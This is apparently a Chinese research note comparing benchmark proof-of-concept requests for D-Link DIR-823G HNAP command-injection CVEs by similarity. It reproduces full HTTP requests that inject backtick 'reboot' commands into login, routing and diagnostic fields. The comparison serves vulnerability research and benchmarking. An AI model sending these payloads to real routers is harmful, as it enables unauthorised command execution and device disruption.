---
title: DIR-823G PoC 大块彩色对照
date: 2026-09-15
firmware: DIR-823G
source_note: "../../DIR-823G.md"
tags:
  - IoT漏洞挖掘
  - CVE
  - PoC相似性
---

# DIR-823G PoC 大块彩色对照

> GitHub 兼容展示版：公共部分保留原文；<mark>黄色区域</mark>表示原 PoC 中的字段、接口、长度或载荷差异；🔴/🟠/🔵表示相似等级。每个请求块仍可直接选中复制，来源链接保持可点击。

> [!WARNING] 仿真环境版本说明
> BM-2024-00002 对应 DIR-823G A1 v1.0.2B03；BM-2024-00083 对应 DIR-823G v1.0.2B05。CVE-2019-15528/15529/15530、CVE-2020-25367/25368 的 NVD 描述指向 V1.0.2B05，但其中部分 seed 挂在 BM-2024-00002；环境与描述存在版本错配，复现时以实际镜像版本为准。

普通文字/边框：原始请求主体的公共部分。　<mark>黄色高亮：原始请求中确实不同的地方。</mark>　🔴标题：相似度高。

## A 级：CVE-2019-7297 ↔ CVE-2022-43109

> [!CAUTION]
> 高度相似组；<mark>黄色高亮</mark>为原 PoC 中实际变化的字段、接口、长度或载荷。

<table border="0" cellpadding="0" cellspacing="16">
<tr>
<td valign="top">
<h3>CVE-2019-7297</h3>
<div>原始来源：<a href="https://raw.githubusercontent.com/a101e-lab/IoTVulBench/main/Vulnerabilities/CVE-2019-7297/BM-2024-00002-payload.seed" target="_blank">IoTVulBench payload.seed ↗</a></div>
<pre>
POST /HNAP1/ HTTP/1.1
Host: TARGET_HOST:PORT
Content-Length: 442
Accept: */*
X-Requested-With: XMLHttpRequest
HNAP_AUTH: &lt;GENERATE_HNAP_AUTH&gt;
SOAPAction: "http://purenetworks.com/HNAP1/<mark>GetWanSettings</mark>"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.110 Safari/537.36
Content-Type: text/xml; charset=UTF-8
Origin: http://TARGET_HOST:PORT
Referer: http://TARGET_HOST:PORT/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: &lt;SESSION_COOKIE&gt;
Connection: close
&nbsp;
&lt;?xml version='1.0' encoding='utf-8'?&gt;&lt;soap:Envelope xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance' xmlns:xsd='http://www.w3.org/2001/XMLSchema' xmlns:soap='http://schemas.xmlsoap.org/soap/envelope/'&gt;  &lt;soap:Body&gt;    &lt;SetNetworkTomographySettings xmlns='http://purenetworks.com/HNAP1/'&gt;      <mark>&lt;Address&gt;;'`reboot`';&lt;/Address&gt;</mark>      <mark>&lt;Number&gt;4&lt;/Number&gt;</mark>          <mark>&lt;Size&gt;4&lt;/Size&gt;</mark>     &lt;/SetNetworkTomographySettings&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;
</pre>
<div>变化 1：SOAPAction 头为 GetWanSettings。变化 2：Address 使用 ;'&#96;reboot&#96;';，Number=4、Size=4。</div>
</td>
<td valign="top">
<h3>CVE-2022-43109</h3>
<div>原始来源：<a href="https://raw.githubusercontent.com/a101e-lab/IoTVulBench/main/Vulnerabilities/CVE-2022-43109/BM-2024-00002-payload.seed" target="_blank">IoTVulBench payload.seed ↗</a></div>
<pre>
POST http://TARGET_HOST:PORT/HNAP1/ HTTP/1.1
Host: TARGET_HOST:PORT
Content-Length: 416
Accept: */*
X-Requested-With: XMLHttpRequest
HNAP_AUTH: &lt;GENERATE_HNAP_AUTH&gt;
SOAPAction: "http://purenetworks.com/HNAP1/<mark>SetNetworkTomographySettings</mark>"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.110 Safari/537.36
Content-Type: text/xml; charset=UTF-8
Origin: http://TARGET_HOST:PORT
Referer: http://TARGET_HOST:PORT/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: &lt;SESSION_COOKIE&gt;
Connection: close
&nbsp;
&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"&gt;&lt;soap:Body&gt;&lt;<mark>SetNetworkTomographySettings</mark> xmlns="http://purenetworks.com/HNAP1/"&gt;<mark>&lt;Address&gt;www.'`reboot`'.com&lt;/Address&gt;</mark><mark>&lt;Number&gt;5&lt;/Number&gt;</mark><mark>&lt;Size&gt;64&lt;/Size&gt;</mark>&lt;/<mark>SetNetworkTomographySettings</mark>&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;
</pre>
<div>变化 1：SOAPAction 头为 SetNetworkTomographySettings。变化 2：Address 使用 www.'&#96;reboot&#96;'.com，Number=5、Size=64。</div>
</td>
</tr>
</table>

判定：请求 Body 的操作名和 Address 注入位置高度一致，属于同接口高相似组；SOAPAction、数字参数和地址包装必须保留为差异。

来源：[CVE-2019-7297 原始请求](../../DIR-823G.md#CVE-2019-7297)、[CVE-2022-43109 原始请求](../../DIR-823G.md#CVE-2022-43109)。

## B 级：CVE-2019-13128 ↔ CVE-2019-15528

> [!WARNING]
> 请求骨架接近，但不能视为同一份 PoC。

<table border="0" cellpadding="0" cellspacing="16">
<tr>
<td valign="top">
<h3>CVE-2019-13128</h3>
<div>原始来源：<a href="https://raw.githubusercontent.com/a101e-lab/IoTVulBench/main/Vulnerabilities/CVE-2019-13128/BM-2024-00083-payload.seed" target="_blank">IoTVulBench payload.seed ↗</a></div>
<pre>
POST /HNAP1/ HTTP/1.1
Host: TARGET_HOST:PORT
Content-Length: 544
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
SOAPAction: "http://purenetworks.com/HNAP1/GetWanCurrentStatus"
X-Requested-With: XMLHttpRequest
HNAP_AUTH: &lt;GENERATE_HNAP_AUTH&gt;
Accept: */*
Content-Type: text/xml; charset=UTF-8
Accept-Language: en-US,en;q=0.9
Origin: http://TARGET_HOST:PORT
Referer: http://TARGET_HOST:PORT/
Accept-Encoding: gzip, deflate, br
Cookie: &lt;SESSION_COOKIE&gt;
Connection: keep-alive
&nbsp;
&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"&gt;&lt;soap:Body&gt;&lt;<mark>SetStaticRouteSettings</mark> xmlns="http://purenetworks.com/HNAP1/"&gt;&lt;<mark>StaticClientInfoList</mark>&gt;&lt;ClientInfo&gt;&lt;IPAddress&gt;10.3.8.211;'<mark>`reboot`</mark>'&lt;/IPAddress&gt;&lt;SubnetMask&gt;255.255.255.255&lt;/SubnetMask&gt;&lt;Gateway&gt;192.168.0.3&lt;/Gateway&gt;&lt;Interface&gt;lan&lt;/Interface&gt;&lt;/ClientInfo&gt;&lt;/<mark>StaticClientInfoList</mark>&gt;&lt;/<mark>SetStaticRouteSettings</mark>&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;
</pre>
<div>变化：SOAPAction 为 GetWanCurrentStatus；列表名为 StaticClientInfoList；注入 IPAddress。</div>
</td>
<td valign="top">
<h3>CVE-2019-15528</h3>
<div>原始来源：<a href="https://raw.githubusercontent.com/a101e-lab/IoTVulBench/main/Vulnerabilities/CVE-2019-15528/BM-2024-00002-payload.seed" target="_blank">IoTVulBench payload.seed ↗</a></div>
<pre>
POST /HNAP1/ HTTP/1.1
Host: TARGET_HOST:PORT
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:107.0) Gecko/20100101 Firefox/107.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: text/xml; charset=utf-8
SOAPAction: "http://purenetworks.com/HNAP1/SetStaticRouteSettings"
HNAP_AUTH: &lt;GENERATE_HNAP_AUTH&gt;
X-Requested-With: XMLHttpRequest
Content-Length: 555
Origin: http://TARGET_HOST:PORT
Connection: close
Referer: http://TARGET_HOST:PORT/
Cookie: &lt;SESSION_COOKIE&gt;
&nbsp;
&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"&gt;&lt;soap:Body&gt;&lt;SetStaticRouteSettings xmlns="http://purenetworks.com/HNAP1/"&gt;&lt;<mark>StaticRouteClientInfoLists</mark>&gt;&lt;ClientInfo&gt;&lt;IPAddress&gt;10.3.8.212&lt;/IPAddress&gt;&lt;SubnetMask&gt;255.255.255.255&lt;/SubnetMask&gt;&lt;Gateway&gt;192.168.0.1&lt;/Gateway&gt;&lt;Interface&gt;<mark>lan'`reboot`'</mark>&lt;/Interface&gt;&lt;/ClientInfo&gt;&lt;/<mark>StaticRouteClientInfoLists</mark>&gt;&lt;/SetStaticRouteSettings&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;
</pre>
<div>变化：SOAPAction 为 SetStaticRouteSettings；列表名为 StaticRouteClientInfoLists；注入 Interface。</div>
</td>
</tr>
</table>

<mark>判定：同一 SetStaticRouteSettings 路由对象模板，但比 A 级多出 SOAPAction、列表名和注入字段差异，属于“明显相似”而不是逐字相同。</mark>

来源：[CVE-2019-13128 原始请求](../../DIR-823G.md#CVE-2019-13128)、[CVE-2019-15528 原始请求](../../DIR-823G.md#CVE-2019-15528)。

## A 级：CVE-2019-15529 ↔ CVE-2019-15530 ↔ CVE-2020-25367 ↔ CVE-2020-25368

> [!CAUTION]
> 高度相似组；<mark>黄色高亮</mark>为原 PoC 中实际变化的字段、接口、长度或载荷。

下面把四条原始 Login 请求按大块展示；公共的 Login XML 用绿色边框，四个注入点用橙色说明。

<table border="0" cellpadding="0" cellspacing="16">
<tr>
<td valign="top">
<h3>CVE-2019-15529</h3>
<div>原始来源：<a href="https://raw.githubusercontent.com/a101e-lab/IoTVulBench/main/Vulnerabilities/CVE-2019-15529/BM-2024-00002-payload.seed" target="_blank">IoTVulBench payload.seed ↗</a></div>
<pre>
POST /HNAP1/ HTTP/1.1
Host: TARGET_HOST:PORT
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:107.0) Gecko/20100101 Firefox/107.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: text/xml; charset=utf-8
SOAPAction: "http://purenetworks.com/HNAP1/Login"
X-Requested-With: XMLHttpRequest
Content-Length: 452
Origin: http://TARGET_HOST:PORT
Connection: close
Referer: http://TARGET_HOST:PORT/
&nbsp;
&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"&gt;&lt;soap:Body&gt;&lt;Login xmlns="http://purenetworks.com/HNAP1/"&gt;&lt;Action&gt;request&lt;/Action&gt;<mark>&lt;Username&gt;Admin'`reboot`'&lt;/Username&gt;</mark>&lt;LoginPassword&gt;&lt;/LoginPassword&gt;&lt;Captcha&gt;&lt;/Captcha&gt;&lt;PrivateLogin&gt;LoginPassword&lt;/PrivateLogin&gt;&lt;/Login&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;
</pre>
<div>注入点：Username。</div>
</td>
<td valign="top">
<h3>CVE-2019-15530</h3>
<div>原始来源：<a href="https://raw.githubusercontent.com/a101e-lab/IoTVulBench/main/Vulnerabilities/CVE-2019-15530/BM-2024-00002-payload.seed" target="_blank">IoTVulBench payload.seed ↗</a></div>
<pre>
POST /HNAP1/ HTTP/1.1
Host: TARGET_HOST:PORT
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:107.0) Gecko/20100101 Firefox/107.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: text/xml; charset=utf-8
SOAPAction: "http://purenetworks.com/HNAP1/Login"
X-Requested-With: XMLHttpRequest
Content-Length: 454
Origin: http://TARGET_HOST:PORT
Connection: close
Referer: http://TARGET_HOST:PORT/
&nbsp;
  &lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"&gt;&lt;soap:Body&gt;&lt;Login xmlns="http://purenetworks.com/HNAP1/"&gt;&lt;Action&gt;request&lt;/Action&gt;&lt;Username&gt;Admin&lt;/Username&gt;<mark>&lt;LoginPassword&gt;'`reboot`'&lt;/LoginPassword&gt;</mark>&lt;Captcha&gt;&lt;/Captcha&gt;&lt;PrivateLogin&gt;LoginPassword&lt;/PrivateLogin&gt;&lt;/Login&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;
</pre>
<div>注入点：LoginPassword。</div>
</td>
</tr>
<tr>
<td valign="top">
<h3>CVE-2020-25367</h3>
<div>原始来源：<a href="https://raw.githubusercontent.com/a101e-lab/IoTVulBench/main/Vulnerabilities/CVE-2020-25367/BM-2024-00002-payload.seed" target="_blank">IoTVulBench payload.seed ↗</a></div>
<pre>
POST /HNAP1/ HTTP/1.1
Host: TARGET_HOST:PORT
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: text/xml; charset=utf-8
SOAPAction: "http://purenetworks.com/HNAP1/Login"
Content-Length: 439
X-Requested-With: XMLHttpRequest
Content-Length: 439
Origin: http://TARGET_HOST:PORT
Connection: close
Referer: http://TARGET_HOST:PORT/
&nbsp;
&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"&gt;&lt;soap:Body&gt;&lt;Login xmlns="http://purenetworks.com/HNAP1/"&gt;&lt;Action&gt;request&lt;/Action&gt;&lt;Username&gt;Admin&lt;/Username&gt;&lt;LoginPassword&gt;&lt;/LoginPassword&gt;<mark>&lt;Captcha&gt;'`reboot`'&lt;/Captcha&gt;</mark>&lt;PrivateLogin&gt;&lt;/PrivateLogin&gt;&lt;/Login&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;
</pre>
<div>注入点：Captcha。</div>
</td>
<td valign="top">
<h3>CVE-2020-25368</h3>
<div>原始来源：<a href="https://raw.githubusercontent.com/a101e-lab/IoTVulBench/main/Vulnerabilities/CVE-2020-25368/BM-2024-00002-payload.seed" target="_blank">IoTVulBench payload.seed ↗</a></div>
<pre>
POST /HNAP1/ HTTP/1.1
Host: TARGET_HOST:PORT
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: text/xml; charset=utf-8
SOAPAction: "http://purenetworks.com/HNAP1/Login"
Content-Length: 439
X-Requested-With: XMLHttpRequest
Content-Length: 439
Origin: http://TARGET_HOST:PORT
Connection: close
Referer: http://TARGET_HOST:PORT/
&nbsp;
&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"&gt;&lt;soap:Body&gt;&lt;Login xmlns="http://purenetworks.com/HNAP1/"&gt;&lt;Action&gt;request&lt;/Action&gt;&lt;Username&gt;Admin&lt;/Username&gt;&lt;LoginPassword&gt;&lt;/LoginPassword&gt;&lt;Captcha&gt;&lt;/Captcha&gt;<mark>&lt;PrivateLogin&gt;'`reboot`'&lt;/PrivateLogin&gt;</mark>&lt;/Login&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;
</pre>
<div>注入点：PrivateLogin。</div>
</td>
</tr>
</table>

判定：四条 Login XML 的字段顺序和整体 Body 几乎完全重复，只轮换 Username、LoginPassword、Captcha、PrivateLogin 四个注入点。

> [!NOTE] Seed 抓包格式特征
> CVE-2020-25367/25368 的重复 Content-Length: 439、CVE-2019-7297 的单引号 XML、CVE-2019-15530 body 行的两个前导空格均按 seed 原文保留，不是排版错误。
